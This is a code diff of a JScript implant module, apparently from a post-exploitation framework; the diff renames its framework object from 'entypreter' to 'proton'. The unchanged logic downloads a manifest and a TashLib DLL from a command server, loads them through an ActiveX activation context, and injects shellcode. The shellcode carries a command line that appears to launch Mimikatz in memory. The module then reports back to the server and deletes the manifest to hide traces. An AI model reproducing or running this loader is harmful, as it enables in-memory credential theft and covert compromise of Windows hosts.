@@ -1,27 +1,27 @@
 try
 {
-    var manifestPath = entypreter.file.getPath("~DIRECTORY~\\TashLib.manifest");
-    entypreter.http.download(manifestPath, "~MANIFESTUUID~");
+    var manifestPath = proton.file.getPath("~DIRECTORY~\\TashLib.manifest");
+    proton.http.download(manifestPath, "~MANIFESTUUID~");
 
-    entypreter.http.download("~DIRECTORY~\\TashLib.dll", "~DLLUUID~");
+    proton.http.download("~DIRECTORY~\\TashLib.dll", "~DLLUUID~");
 
     var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
     actCtx.Manifest = manifestPath;
     var tash =  actCtx.CreateObject("TashLib.TashLoader");
 
-    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + entypreter.work.make_url();
+    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + proton.work.make_url();
 
     // TSC = "\x..."
     ~SHIMX86BYTES~
 
     var res = tash.Load(TSC, shim_lpParam, ~SHIMX86OFFSET~);
 
-    entypreter.work.report("Success");
+    proton.work.report("Success");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.file.deleteFile(manifestPath);
-entypreter.exit();
+proton.file.deleteFile(manifestPath);
+proton.exit();
